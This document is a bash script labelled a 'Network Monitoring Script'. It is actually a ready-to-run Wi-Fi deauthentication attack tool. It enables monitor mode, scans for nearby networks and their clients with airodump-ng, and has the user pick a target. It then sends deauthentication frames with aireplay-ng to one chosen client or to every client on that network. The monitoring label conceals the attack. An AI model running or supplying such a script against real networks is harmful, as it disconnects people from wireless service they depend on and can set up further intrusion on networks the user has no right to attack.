#!/bin/bash

# Network Monitoring Script

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

# Function to display available network interfaces
show_interfaces() {
    echo "Available network interfaces:"
    ip link show | grep -E '^[0-9]+:' | cut -d: -f2 | sed 's/^ //'
}

# Function to select network interface
select_interface() {
    show_interfaces
    echo "Enter the interface name to use:"
    read interface
    
    # Check if interface exists
    if ! ip link show "$interface" &>/dev/null; then
        echo "Interface $interface does not exist."
        return 1
    fi
    
    # Put interface in monitor mode
    echo "Putting $interface into monitor mode..."
    airmon-ng check kill
    airmon-ng start "$interface"
    
    # Get the monitor interface name (usually interface + mon)
    monitor_interface="${interface}mon"
    if ! ip link show "$monitor_interface" &>/dev/null; then
        monitor_interface="$interface"
    fi
    
    echo "Monitor interface: $monitor_interface"
    return 0
}

# Function to scan for networks using airodump-ng
scan_networks() {
    echo "Scanning for wireless networks on $monitor_interface..."
    echo "Press Ctrl+C when you want to stop scanning."
    
    # Create a temporary file to store scan results
    temp_file="/tmp/network_scan.csv"
    
    # Start airodump-ng in another terminal
    airodump-ng -w "$temp_file" --output-format csv "$monitor_interface" &
    airodump_pid=$!
    
    # Wait for user to press Ctrl+C
    echo "Scanning in progress. Press Enter to stop..."
    read
    
    # Kill airodump-ng
    kill $airodump_pid 2>/dev/null
    
    # Parse and display networks from CSV file
    if [ -f "${temp_file}-01.csv" ]; then
        echo "Available networks:"
        # Skip header line and empty lines, then display networks with their BSSIDs
        networks=$(grep -a -v "^$" "${temp_file}-01.csv" | tail -n +2 | awk -F, '{print NR". BSSID: "$1" Channel: "$4" ESSID: "$14}')
        echo "$networks"
        
        # Store the networks for later use
        echo "$networks" > /tmp/available_networks.txt
    else
        echo "No networks found or scan interrupted."
        return 1
    fi
    
    return 0
}

# Function to select target network
select_target() {
    echo "Enter the number of the network to target:"
    read target_num
    
    # Get the selected network's BSSID and channel
    selected=$(sed -n "${target_num}p" /tmp/available_networks.txt)
    
    if [ -z "$selected" ]; then
        echo "Invalid selection."
        return 1
    fi
    
    # Extract BSSID and channel
    target_bssid=$(echo "$selected" | grep -oE "BSSID: ([0-9A-F:]{17})" | cut -d' ' -f2)
    target_channel=$(echo "$selected" | grep -oE "Channel: ([0-9]+)" | cut -d' ' -f2)
    target_essid=$(echo "$selected" | grep -oE "ESSID: ([^ ]+)$" | cut -d' ' -f2)
    
    echo "Selected target network: $target_essid (BSSID: $target_bssid, Channel: $target_channel)"
    
    # Get clients of the selected network
    echo "Scanning for clients on $target_essid..."
    echo "Press Enter to stop scanning for clients..."
    
    # Start targeted scan
    airodump-ng -c "$target_channel" --bssid "$target_bssid" -w "/tmp/client_scan" --output-format csv "$monitor_interface" &
    client_scan_pid=$!
    
    read
    
    # Kill the client scan
    kill $client_scan_pid 2>/dev/null
    
    # Parse and display clients
    if [ -f "/tmp/client_scan-01.csv" ]; then
        # Skip to the "Station MAC" section and display clients
        clients=$(awk -F, '/Station MAC/{flag=1;next} flag' "/tmp/client_scan-01.csv" | grep -v "^$" | awk -F, '{print NR". Client MAC: "$1" Power: "$4}')
        
        if [ -z "$clients" ]; then
            echo "No clients found for this network."
            return 1
        fi
        
        echo "Found clients:"
        echo "$clients"
        echo "$clients" > /tmp/available_clients.txt
    else
        echo "No client scan data available."
        return 1
    fi
    
    return 0
}

# Function to perform deauth attack
perform_deauth() {
    echo "Select client to deauthenticate (enter number or 'all' for all clients):"
    read client_choice
    
    if [ "$client_choice" = "all" ]; then
        echo "Sending deauthentication packets to all clients..."
        aireplay-ng --deauth 10 -a "$target_bssid" "$monitor_interface"
    else
        # Get the selected client MAC
        selected_client=$(sed -n "${client_choice}p" /tmp/available_clients.txt)
        
        if [ -z "$selected_client" ]; then
            echo "Invalid selection."
            return 1
        fi
        
        client_mac=$(echo "$selected_client" | grep -oE "Client MAC: ([0-9A-F:]{17})" | cut -d' ' -f3)
        echo "Sending deauthentication packets to client $client_mac..."
        aireplay-ng --deauth 10 -a "$target_bssid" -c "$client_mac" "$monitor_interface"
    fi
    
    return 0
}

# Function to clean up
cleanup() {
    echo "Cleaning up..."
    # Stop monitor mode
    airmon-ng stop "$monitor_interface" 2>/dev/null
    
    # Remove temporary files
    rm -f "/tmp/network_scan-01.csv" "/tmp/available_networks.txt" "/tmp/client_scan-01.csv" "/tmp/available_clients.txt"
    
    echo "Done."
    exit 0
}

# Set up trap to clean up on exit
trap cleanup EXIT INT TERM

# Main program
echo "Network Monitoring Script"
echo "------------------------"

# Initialize variables
monitor_interface=""
target_bssid=""
target_channel=""

# Run functions
select_interface
if [ $? -eq 0 ]; then
    scan_networks
    if [ $? -eq 0 ]; then
        select_target
        if [ $? -eq 0 ]; then
            perform_deauth
        fi
    fi
fi

echo "Script completed."
